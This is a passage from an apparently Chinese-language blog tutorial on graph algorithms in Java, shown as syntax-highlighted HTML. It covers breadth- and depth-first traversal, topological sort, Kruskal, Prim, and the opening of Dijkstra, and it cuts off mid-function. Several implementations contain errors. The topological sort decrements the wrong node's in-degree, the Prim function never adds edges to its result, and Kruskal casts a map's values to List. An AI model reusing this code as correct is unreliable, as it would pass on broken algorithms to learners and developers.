punctuation">;</span>        fromNode<span class="token punctuation">.</span>out<span class="token operator">++</span><span class="token punctuation">;</span>        toNode<span class="token punctuation">.</span>in<span class="token operator">++</span><span class="token punctuation">;</span>        fromNode<span class="token punctuation">.</span>edges<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>newEdge<span class="token punctuation">)</span><span class="token punctuation">;</span>        graph<span class="token punctuation">.</span>edges<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>newEdge<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> graph<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="宽度优先遍历-1"><a href="#宽度优先遍历-1" class="headerlink" title="宽度优先遍历"></a>宽度优先遍历</h3><p>建立一个队列和一个哈希set，从给定节点开始，入队，出队，打印，入队的同时注意在哈希set里也将其加入，为了防止A指向C，C又指向A，死循环，可以理解为节点进入了set，就相当于已经注册了</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">BFS</span><span class="token punctuation">(</span><span class="token class-name">Node</span> n<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>n <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token class-name">Queue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">></span></span> queue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LinkedList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">HashSet</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">></span></span> set <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashSet</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>    set<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>queue<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">Node</span> cur <span class="token operator">=</span> queue<span class="token punctuation">.</span><span class="token function">poll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>cur<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Node</span> next<span class="token operator">:</span>cur<span class="token punctuation">.</span>nexts<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>set<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>next<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                set<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>next<span class="token punctuation">)</span><span class="token punctuation">;</span>                queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>next<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="深度优先遍历"><a href="#深度优先遍历" class="headerlink" title="深度优先遍历"></a>深度优先遍历</h3><p>不使用队列，使用栈。从给定节点开始入栈，然后弹出，当遇到没有注册过的节点，将弹出的节点重新压入，将这个没有注册过的压入，注册之后，重新进行循环</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">DFS</span><span class="token punctuation">(</span><span class="token class-name">Node</span> n<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>n <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token class-name">Stack</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">></span></span> stack <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Stack</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">HashSet</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">></span></span> set <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashSet</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>    set<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>n<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>stack<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">Node</span> cur <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Node</span> next<span class="token operator">:</span>cur<span class="token punctuation">.</span>nexts<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>set<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>next<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                set<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>next<span class="token punctuation">)</span><span class="token punctuation">;</span>                stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>cur<span class="token punctuation">)</span><span class="token punctuation">;</span>                stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>next<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>next<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="拓扑排序"><a href="#拓扑排序" class="headerlink" title="拓扑排序"></a>拓扑排序</h3><p>即图中某些点依赖于其他的点，具体到问题中是需要先完成某些事，才能做其他的某些事，所以需要找到最先能够不依赖别的事情的事，完成它们，然后才能完成其他的事，这就形成了一个顺序，即为拓扑排序</p><blockquote><p>前提是没有环，即不存在事件A依赖于事件B，事件B又依赖于事件A</p></blockquote><p>如何解决？可以先找到入度为0的点，然后将从该点和该点指出去的线删掉，找到下一个入度为0的点，依次进行即可</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">></span></span> <span class="token function">topologySort</span><span class="token punctuation">(</span><span class="token class-name">Graph</span> graph<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">// value为节点当前剩余的入度</span>    <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">></span></span> map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 用于储存入度为0的节点</span>    <span class="token class-name">Queue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">></span></span> zeroInQueue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LinkedList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Node</span> each<span class="token operator">:</span>graph<span class="token punctuation">.</span>nodes<span class="token punctuation">.</span><span class="token function">values</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>each<span class="token punctuation">,</span> each<span class="token punctuation">.</span>in<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>each<span class="token punctuation">.</span>in <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> zeroInQueue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>each<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 至此找到了第一批入度为0的点</span>    <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">></span></span> result <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>zeroInQueue<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">Node</span> cur <span class="token operator">=</span> zeroInQueue<span class="token punctuation">.</span><span class="token function">poll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        result<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>cur<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Node</span> next<span class="token operator">:</span>cur<span class="token punctuation">.</span>nexts<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> temp <span class="token operator">=</span> map<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>cur<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>            map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>next<span class="token punctuation">,</span> temp<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>temp <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> zeroInQueue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>next<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="最小生成树问题"><a href="#最小生成树问题" class="headerlink" title="最小生成树问题"></a>最小生成树问题</h3><p>即保证图连通，并且所有边加起来权重最小，下面的两个算法适用于无向图</p><h4 id="K-kruskal-算法"><a href="#K-kruskal-算法" class="headerlink" title="K (kruskal) 算法"></a>K (kruskal) 算法</h4><p>即初始状态下每个点为独立的一个集合，将所有边按权重从小到大排列，然后遍历整个边集，从最小的开始，如果边的from和to不在一个集合中，则合并为一个集合</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> mySets<span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">,</span> <span class="token class-name">List</span><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">></span><span class="token punctuation">></span></span> map<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">mySets</span><span class="token punctuation">(</span><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">></span></span> nodes<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Node</span> each<span class="token operator">:</span>nodes<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">></span></span> set <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            set<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>each<span class="token punctuation">)</span><span class="token punctuation">;</span>            map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>each<span class="token punctuation">,</span> set<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">isSameSet</span><span class="token punctuation">(</span><span class="token class-name">Node</span> from<span class="token punctuation">,</span> <span class="token class-name">Node</span> <span class="token keyword">to</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">></span></span> set1 <span class="token operator">=</span> map<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>from<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">></span></span> set2 <span class="token operator">=</span> map<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token keyword">to</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> set1 <span class="token operator">==</span> set2<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">union</span><span class="token punctuation">(</span><span class="token class-name">Node</span> from<span class="token punctuation">,</span> <span class="token class-name">Node</span> <span class="token keyword">to</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">></span></span> set1 <span class="token operator">=</span> map<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>from<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">></span></span> set2 <span class="token operator">=</span> map<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token keyword">to</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Node</span> each<span class="token operator">:</span>set2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            set1<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>each<span class="token punctuation">)</span><span class="token punctuation">;</span>            map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>each<span class="token punctuation">,</span> set1<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> edgeComparator <span class="token keyword">implements</span> <span class="token class-name">Comparator</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Edge</span><span class="token punctuation">></span></span><span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">compare</span><span class="token punctuation">(</span><span class="token class-name">Edge</span> o1<span class="token punctuation">,</span> <span class="token class-name">Edge</span> o2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> o1<span class="token punctuation">.</span>weight <span class="token operator">-</span> o2<span class="token punctuation">.</span>weight<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Set</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Edge</span><span class="token punctuation">></span></span> <span class="token function">kruskal</span><span class="token punctuation">(</span><span class="token class-name">Graph</span> graph<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    mySets myset <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">mySets</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">></span></span><span class="token punctuation">)</span> graph<span class="token punctuation">.</span>nodes<span class="token punctuation">.</span><span class="token function">values</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">PriorityQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Edge</span><span class="token punctuation">></span></span> pq <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PriorityQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token function">edgeComparator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Set</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Edge</span><span class="token punctuation">></span></span> result <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashSet</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Edge</span> each<span class="token operator">:</span>graph<span class="token punctuation">.</span>edges<span class="token punctuation">)</span> pq<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>each<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>pq<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">Edge</span> edge <span class="token operator">=</span> pq<span class="token punctuation">.</span><span class="token function">poll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Node</span> from <span class="token operator">=</span> edge<span class="token punctuation">.</span>from<span class="token punctuation">;</span>        <span class="token class-name">Node</span> <span class="token keyword">to</span> <span class="token operator">=</span> edge<span class="token punctuation">.</span><span class="token keyword">to</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>myset<span class="token punctuation">.</span><span class="token function">isSameSet</span><span class="token punctuation">(</span>from<span class="token punctuation">,</span> <span class="token keyword">to</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            result<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>edge<span class="token punctuation">)</span><span class="token punctuation">;</span>            myset<span class="token punctuation">.</span><span class="token function">union</span><span class="token punctuation">(</span>from<span class="token punctuation">,</span> <span class="token keyword">to</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>可以使用并查集替代<code>mySets</code>，更加高效</p></blockquote><h4 id="p-prim-算法"><a href="#p-prim-算法" class="headerlink" title="p (prim) 算法"></a>p (prim) 算法</h4><p>该算法不需要突然将两个集合连接起来，具体逻辑为从某点开始，解锁所有与该点连接的边，然后挑选权重最小的边，看该条边另一端的点，是否注册过，没有就加入这条边，直至将所有点遍历完毕</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Set</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Edge</span><span class="token punctuation">></span></span> <span class="token function">prim</span><span class="token punctuation">(</span><span class="token class-name">Graph</span> graph<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">Set</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Edge</span><span class="token punctuation">></span></span> result <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashSet</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">HashSet</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">></span></span> set <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashSet</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">PriorityQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Edge</span><span class="token punctuation">></span></span> pq <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PriorityQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token function">edgeComparator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 这个大循环的作用是防止有森林的出现，即整个图不连通，分为几个独立的连通的区域</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Node</span> node<span class="token operator">:</span>graph<span class="token punctuation">.</span>nodes<span class="token punctuation">.</span><span class="token function">values</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>set<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            set<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Edge</span> each<span class="token operator">:</span>node<span class="token punctuation">.</span>edges<span class="token punctuation">)</span> pq<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>each<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>pq<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">Edge</span> edge <span class="token operator">=</span> pq<span class="token punctuation">.</span><span class="token function">poll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">Node</span> <span class="token keyword">to</span> <span class="token operator">=</span> edge<span class="token punctuation">.</span><span class="token keyword">to</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>set<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token keyword">to</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    set<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">to</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Edge</span> each<span class="token operator">:</span><span class="token keyword">to</span><span class="token punctuation">.</span>edges<span class="token punctuation">)</span> pq<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>each<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Edge</span> each<span class="token operator">:</span><span class="token keyword">to</span><span class="token punctuation">.</span>edges<span class="token punctuation">)</span> pq<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>each<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>该行代码会重复把同一条边加入堆中，但是并不影响结果，而且边是有限的，外一层每次循环都会弹出一个，不会造成死循环</p></blockquote><h3 id="Dijkstra算法"><a href="#Dijkstra算法" class="headerlink" title="Dijkstra算法"></a>Dijkstra算法</h3><p>给定一个出发点，算法会得出从该点到其他点的最小距离，该算法只适用于权重为正数的边</p><h4 id="1-0-4"><a href="#1-0-4" class="headerlink" title="1.0"></a>1.0</h4><p>假定出发点为A，算到B，C，D的最小值</p><p>首先定义一张表，含有从出发点到每个点的距离，初始状态当然为到A的为0，到B，C，D的为无穷大</p><p>每次选择表中距离最小的点，第一次当然选择A，然后看从该点指出来的边，与表中比对，是否使用这些边使得表中的距离可以变小，然后修改，一轮过后，循环直到遍历所有点（每次循环都会搞定一个点，称之为锁死一个点，之后不会再改变到该点的距离）</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">></span></span> <span class="token function">dijkstra</span><span class="token punctuation">(</span><span class="token class-name">Node</span> head<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">></span></span> distanceMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">HashSet</span><span class="token 